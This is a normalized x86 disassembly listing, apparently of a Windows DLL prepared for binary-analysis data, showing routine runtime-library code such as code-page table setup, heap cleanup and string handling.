mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_1002fb6b
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_10067d3a
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_10067d3a
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_10067d3a
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_10067d3a
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1000932c
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10035d06
push [ ebp - 0x1c ]
call sub_10035d06
push [ ebp - 0x20 ]
call sub_10035d06
push [ ebp - 0x28 ]
call sub_10035d06
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10035d06
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_1001462a
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_1006e5c0
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_1006e5c0
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_1007f5d0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_1007f5d0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_1007f5d0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10035d06
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10035d06
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10035d06
push [ esi + 0xc0 ]
call sub_10035d06
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_1001eb83
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
jbe r-xdata
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_1000831a
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_1003c132
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp eax 0x8
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
jae r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
push eax
push 0x1
call sub_1003c519
jmp r-xdata
mov eax esi
sub_1001ebf0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
push ecx
call sub_1002cd00
mov ecx [ ebx ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x70 ] eax
call sub_1005deb0
mov eax [ eax ]
mov edi [ HeapFree@IAT ]
test eax eax
mov eax [ ebp - 0x64 ]
setne [ ebp - 0x69 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x69 ] 0x0
lea esi [ ebp - 0x68 ]
je r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
mov eax [ ebx ]
push eax
call sub_10038550
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
call sub_1005deb0
mov ebx [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_1001f5f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x70 ]
cmp eax 0x7
jne r-xdata
mov ecx [ ebx ]
push ecx
lea esi [ ebp - 0x68 ]
call sub_10038550
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
xor ebx ebx
cmp [ eax ] ebx
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
cmp eax 0x2
jne r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_1001f5f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x8
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
push 0x3e8
call [ Sleep@IAT ]
xor eax eax
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_10054d00
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10019e70
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
mov esi eax
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ ebx + 0x14 ]
jb r-xdata
mov [ ebp - 0x64 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x9
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1006b8a0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
call sub_1006a5b0
cmp eax 0xb
jne r-xdata
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] ebx
cmp eax ebx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edx edx
mov [ ebp - 0x4c ] 0x7
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x60 ] dx
cmp esi edi
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1006b8a0
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax ]
call sub_10051bc0
jmp r-xdata
push 0x1
call sub_1005d590
mov ecx esi
call sub_10019ca0
jmp r-xdata
lea ecx [ ecx ]
mov [ ebp - 0x64 ] ebx
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x6
call edx
jmp r-xdata
cmp esi [ rw-data ]
jne r-xdata
add esi 0x24
cmp esi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_100709fb
add esp 0x8
test eax eax
je r-xdata
cmp eax 0xc
jne r-xdata
xor edx edx
cmp [ rw-data ] edx
sete dl
mov [ rw-data ] edx
jmp r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_1006b8a0
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax ]
call sub_1003ca60
jmp r-xdata
test eax eax
lea edi [ ebp - 0x68 ]
sete bl
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004cac0
test bl bl
je r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
lea edi [ esi + 0x20 ]
lea ecx [ esi + 0x1c ]
mov edx ebx
call sub_1002e9a0
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x103
call sub_10045930
lea edx [ ebp - 0x44 ]
mov eax 0xb0
call sub_10045930
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10046ae0
mov esi eax
test esi esi
je r-xdata
cmp edi [ rw-data ]
je r-xdata
add edi 0x24
cmp edi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_100709fb
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x4
je r-xdata
push 0x1
call sub_10051e20
jmp r-xdata
mov ecx [ ebx ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_10046ae0
mov esi eax
test esi esi
je r-xdata
push esi
call sub_1003bfca
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10058050
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
lea ecx [ edi + 0x20 ]
push ecx
lea ecx [ edi + 0x1c ]
call sub_1000b1b0
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x5
jne r-xdata
add esp 0x4
mov eax [ rw-data ]
fld [ eax + 0xfc ]
sub esp 0x8
fstp [ esp + 0x4 ]
fld [ eax + 0xf8 ]
fstp [ esp ]
call sub_10055d00
add esp 0x8
jmp r-xdata
push esi
call sub_1003bfca
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_1000a850
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
call sub_10046440
sub_1001f06c
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x1c ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1001f0b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x28 ] eax
lea edi [ ebp - 0x24 ]
call sub_100463af
test al al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
xor bl bl
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
lea eax [ ebp - 0x2c ]
push eax
push 0xa
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x2c ] ebx
call sub_10060a86
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_100463af
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_1005f1e2
push [ ebp - 0x28 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1005f1e2
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x30 ] eax
je r-xdata
inc ebx
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
or ebx 0x2
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov ecx esi
mov bl 0x1
call sub_1005f1e2
inc edi
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_1001f230
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e01
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
push edi
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
sub_1001f2f0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x6c ] edi
call sub_1000eaf0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x68 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor esi esi
cmp eax esi
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x11c
call sub_10053240
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
push edx
mov [ ebp - 0x60 ] esi
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x60 ]
cmp ecx esi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x22
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] esi
call sub_10023dc0
test eax eax
je r-xdata
inc ebx
cmp ebx [ ebp - 0x68 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x64 ]
mov edi [ ebp - 0x6c ]
push esi
add edi 0x130
call sub_1005ae90
test esi esi
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x60 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x38
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_10053240
sub_1001f480
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push edi
mov edi [ lstrcmpW@IAT ]
mov edi edi
pop edi
mov eax esi
pop esi
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax [ esi ]
push ecx
mov ecx [ eax ]
push ecx
call edi
test eax eax
je r-xdata
sub_1001f4b0
push ebp
mov ebp esp
mov edx 0x30c
mov ecx esi
xor eax eax
lea esp [ esp ]
test edx edx
jne r-xdata
add ecx 0x2
dec edx
jne r-xdata
mov ecx 0x30c
sub ecx edx
jmp r-xdata
mov eax 0x80070057
xor ecx ecx
cmp [ ecx ] ax
je r-xdata
jmp r-xdata
test eax eax
js r-xdata
pop ebp
retn 0x4
mov eax 0x30c
sub eax ecx
lea ecx [ esi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_10072800
sub_1001f500
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
je r-xdata
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_1006de00
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
add esp 0x10
and edx 0xfffffffc
and ecx 0xfffffffc
cmp ecx edx
mov edx [ ebp + 0x14 ]
push edx
push esi
jge r-xdata
mov edx [ ebp + 0x14 ]
push edx
push edi
push ebx
call sub_1006c2d0
add esp 0xc
mov eax edi
sub eax ebx
and eax 0xfffffffc
cmp eax 0x4
jle r-xdata
push edi
push eax
call sub_1001f500
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push ebx
call sub_1001f500
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ebx ecx
jmp r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax edi
call sub_10055030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx edi
mov eax ebx
call sub_10051a80
add esp 0x4
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_1001f5f0
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x10 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x50 ] 0x0
je r-xdata
push eax
call edi
add esi 0x54
cmp [ esi ] 0x0
je r-xdata
mov [ esi + 0x50 ] 0x0
pop edi
pop esi
retn
call sub_10005d80
sub_1001f65f
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1001caa1
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
sub_1001f6d0
push 0x3
call sub_10018233
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100134bc
push 0xff
call sub_100134bc
pop ecx
pop ecx
push 0x3
call sub_10018233
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1001f709
push 0x28
mov eax sub_1008552b
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10069606
mov [ esi ] r--data
jmp r-xdata
sub_1001f7a0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_10022749
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001f7d0
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edx
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
call sub_10060900
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_1005c3d0
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
mov esp ebp
pop ebp
retn 0x4
xor eax eax
